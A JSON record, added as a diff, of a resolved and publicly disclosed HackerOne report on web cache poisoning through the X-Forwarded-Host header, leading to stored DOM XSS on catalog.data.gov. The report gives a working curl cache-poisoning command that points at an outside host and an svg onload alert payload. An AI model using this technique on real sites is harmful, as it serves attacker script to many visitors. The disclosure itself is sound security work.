@@ -1,0 +1,153 @@
+{
+  "id": 303730,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMDM3MzA=",
+  "url": "https://hackerone.com/reports/303730",
+  "title": "Defacement of catalog.data.gov via web cache poisoning to stored DOMXSS",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-01-10T12:23:37.143Z",
+  "submitted_at": "2018-01-10T12:23:37.143Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "albinowax",
+    "url": "/albinowax",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 50592,
+    "url": "https://hackerone.com/gsa_bbp",
+    "handle": "gsa_bbp",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/iyPFgzbsX86VXw5wJHyfPg9s/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/iyPFgzbsX86VXw5wJHyfPg9s/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "GSA Bounty",
+      "twitter_handle": null,
+      "website": "http://gsa.gov",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-11-01T21:16:04.418Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-10-22T08:25:26.812Z",
+  "team_member_agreed_on_going_public_at": "2018-11-01T21:16:04.340Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "An attacker can deface various pages on catalog.data.gov, leading to them executing malicious JavaScript when visited by a normal user.\n\nThe root problem is that the server trusts the X-Forwarded-Host HTTP header, and uses this to populate the 'data-site-root' and 'data-locale-root' attributes on the <body tag. Some JavaScript then fetches a JSON file from the URL specified in these attributes, and writes the response to the page without escaping it, leading to a DOMXSS vulnerability.\n\nThis behaviour is harmless by itself, since I can't make a victim send a malicious HTTP header. Fortunately for me, I can ensure that the poisoned response sent to me is cached by CloudFront, meaning my payload will be served to loads of other users. \n\nPlease be careful when exploring this issue, as it's potentially quite easy to accidentally poison CloudFront's cache and antagonise your visitors. To safely replicate this issue, you can use the following steps:\n\n1. Run curl command to poison cache:\ncurl -i -s -k  -X $'GET' \\\n    -H $'Host: catalog.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: */*' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H $'Connection: close' \\\n    $'https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6' > /dev/null\n\n2. Visit the poisoned page:\nhttps://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6\n\n3. Wait for a few seconds, and observe the popup caused by our injected alert(document.domain)\n\nBehind the scenes, step 1 poisons the cache with a data-site-root value of 'portswigger-labs.net/catalog.data.gov_json_xss/json.php'. In step 2, some JavaScript fetches our json.php file from portswigger-labs.net, and uses our 'show more' JSON attribute to translate the 'show more' text on https://catalog.data.gov/dataset/consumer-complaint-database into \"Mostrar más <svg onload=alert(document.domain)>\"\n\nThis is the offending line of JavaScript:\nvar template_more = ['<tr class=\"toggle-show toggle-show-more\">', '<td colspan=\"' + cols + '\">', '<small>', '<a href=\"#\" class=\"show-more\">' + this.i18n('show_more') + '</a>', '<a href=\"#\" class=\"show-less\">' + this.i18n('show_less') + '</a>', '</small>', '</td>', '</tr>'].join('\\n');\n\nTo mitigate this issue, I recommend addressing the X-Forwarded-Host reflection. \n\nPlease let me know if you have any questions.\n\nCheers,\n\nJames & Gareth\n\n## Impact\n\nAn attacker can deface most pages on catalog.data.gov.",
+  "bounty_amount": "750.0",
+  "formatted_bounty": "$750",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 252795,
+      "file_name": "Screen_Shot_2018-01-10_at_12.11.01.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/252/795/d7c51591a6c2ad3957c229e1e37fe4764848d9e6/Screen_Shot_2018-01-10_at_12.11.01.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-01-10_at_12.11.01.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-01-10_at_12.11.01.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTPZNC2VJ%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T153034Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB0aCXVzLXdlc3QtMiJGMEQCIGOeIibeIlvktPdkcStOSMyU%2BbReWiC5UQVnbnI09Dl6AiAO%2B%2F%2FrSMhUx9tMfmb5wIaMiLJHENuUWzc5tsWbhQc32Cq7BQjm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIM7lRrW6AbiHpdNCIHKo8Fj7UpLQFh4zMnY3jGeICstGG8v%2FPO1jy3cZ6pxg2iglcoO4hdCgLoCVfjbpXEr5oH6DeQ7QumDpuR88zYEQRX1fm%2B5a5s7zZseogxgL0yPGsD276UAhyRN06IGxX8kuQh%2BS8%2FHm5f9z7oeTCH8XjMPjqVQNS5JQXHFrq3ImSipju3FjHPHHH8lNCBOLo%2FkLjPVRHEpaTUT4C%2FNPN8xP%2Bq1IUC4ag3rNUCxlPI6T7081U6GmmOK8gUJoP1uVkbAq4LQRPW7tlB1OHN1ZMTsx13xfmDOLER8E2%2FAGzzK554W6X8Ctt7ilZo1GzZgDLjYCpCt0Gnne7879XyFq1n1xiUEHT7cSwo2Y9S35ht1R%2BnJQylPDRQPphpn%2B7O5KNquVqyorZm7H%2FJFNJ5Ia3P3Syy7ah5dPmvGzqOfLotWR%2BquHdXEOL2ImRrgO6Z7%2BU4d47EhdzaLDYS9f1AgftmrmfftYclEqPtKDJArjzwPLWgMfCchojdpYtq1lOrhkgR4cBYtNgz%2BjyoUtgmeQxR5NjLYRVURU96cLCpxfy69b90xiFVDxhiraDaNPrVm6GfVYzhOsd0XEYeLtrYo54dM0cH9kXYhpRv5Ju5EzVwA7Nv%2ByP9lkkh1XU64ar4vmguOsqeVElLDV8X7xz%2B3TODfas0HHViY%2FtdeZSEB99TwyrDaKSFmbqSUiaeLR3j78MN9FwFy6utGKRqvIe8L6dudilN6I8H5K8tZlrN9k320He41mPkysTJj9wP6S5YhlhUejzYfKszsitH%2BbLBuwS%2FnQbw2UKB7vFLB1B%2Bafnq7YdvxYO2%2BJNsKbTacfDyLuQQYFx5hBXBs9hgXGzuqRH7dvZOM%2FdtByRIyRLdJYhcVPVSxTDHz%2FzPBjqyAcY36EefNEghHwns%2Fo6uJ3AEdiibcs%2BhCBgAk%2B3aIepi4wvsnI7yj8jFI89K%2F22lH6wMbBDrmUekh0364CYpSweyTZtj1SD%2BHzwcBIRjsrqIDgyK6fHWvErhgkfhGFwVAQKLKHroZA1yYxJP22Ym86HUnEl1CLH6oUILUz%2Fus2VgH4vR%2FLgGUvteZpqXMlTlBo0bspGXBzMaA4sNGBThC6dWB6rZjuarVh7e5e%2BEy1DaGn8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=230eac7bc493336cf5744bfde862372b8d7aa289f6d8816ae0694044a85926d1",
+      "file_size": 249936,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 252796,
+      "file_name": "Screen_Shot_2018-01-10_at_12.13.45.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/252/796/b6b4478eac78315f6e0ead7aabeaa4bf1bcd9312/Screen_Shot_2018-01-10_at_12.13.45.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-01-10_at_12.13.45.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-01-10_at_12.13.45.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTPZNC2VJ%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T153034Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB0aCXVzLXdlc3QtMiJGMEQCIGOeIibeIlvktPdkcStOSMyU%2BbReWiC5UQVnbnI09Dl6AiAO%2B%2F%2FrSMhUx9tMfmb5wIaMiLJHENuUWzc5tsWbhQc32Cq7BQjm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIM7lRrW6AbiHpdNCIHKo8Fj7UpLQFh4zMnY3jGeICstGG8v%2FPO1jy3cZ6pxg2iglcoO4hdCgLoCVfjbpXEr5oH6DeQ7QumDpuR88zYEQRX1fm%2B5a5s7zZseogxgL0yPGsD276UAhyRN06IGxX8kuQh%2BS8%2FHm5f9z7oeTCH8XjMPjqVQNS5JQXHFrq3ImSipju3FjHPHHH8lNCBOLo%2FkLjPVRHEpaTUT4C%2FNPN8xP%2Bq1IUC4ag3rNUCxlPI6T7081U6GmmOK8gUJoP1uVkbAq4LQRPW7tlB1OHN1ZMTsx13xfmDOLER8E2%2FAGzzK554W6X8Ctt7ilZo1GzZgDLjYCpCt0Gnne7879XyFq1n1xiUEHT7cSwo2Y9S35ht1R%2BnJQylPDRQPphpn%2B7O5KNquVqyorZm7H%2FJFNJ5Ia3P3Syy7ah5dPmvGzqOfLotWR%2BquHdXEOL2ImRrgO6Z7%2BU4d47EhdzaLDYS9f1AgftmrmfftYclEqPtKDJArjzwPLWgMfCchojdpYtq1lOrhkgR4cBYtNgz%2BjyoUtgmeQxR5NjLYRVURU96cLCpxfy69b90xiFVDxhiraDaNPrVm6GfVYzhOsd0XEYeLtrYo54dM0cH9kXYhpRv5Ju5EzVwA7Nv%2ByP9lkkh1XU64ar4vmguOsqeVElLDV8X7xz%2B3TODfas0HHViY%2FtdeZSEB99TwyrDaKSFmbqSUiaeLR3j78MN9FwFy6utGKRqvIe8L6dudilN6I8H5K8tZlrN9k320He41mPkysTJj9wP6S5YhlhUejzYfKszsitH%2BbLBuwS%2FnQbw2UKB7vFLB1B%2Bafnq7YdvxYO2%2BJNsKbTacfDyLuQQYFx5hBXBs9hgXGzuqRH7dvZOM%2FdtByRIyRLdJYhcVPVSxTDHz%2FzPBjqyAcY36EefNEghHwns%2Fo6uJ3AEdiibcs%2BhCBgAk%2B3aIepi4wvsnI7yj8jFI89K%2F22lH6wMbBDrmUekh0364CYpSweyTZtj1SD%2BHzwcBIRjsrqIDgyK6fHWvErhgkfhGFwVAQKLKHroZA1yYxJP22Ym86HUnEl1CLH6oUILUz%2Fus2VgH4vR%2FLgGUvteZpqXMlTlBo0bspGXBzMaA4sNGBThC6dWB6rZjuarVh7e5e%2BEy1DaGn8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0eed5cdbb9c755a4f11cec86e7f2aa00c1c57a802b1de16f2913f336fb168d39",
+      "file_size": 263309,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 91,
+  "voters": [
+    "dphoeniixx",
+    "loaymorad",
+    "smither",
+    "defenderwww",
+    "he4am",
+    "badf00d",
+    "sp1d3rs",
+    "stefanovettorazzi",
+    "albinowax",
+    "tiger24",
+    "and 81 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.6,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "high",
+      "availability": "low"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 81477,
+    "asset_type": "URL",
+    "asset_identifier": "catalog.data.gov",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
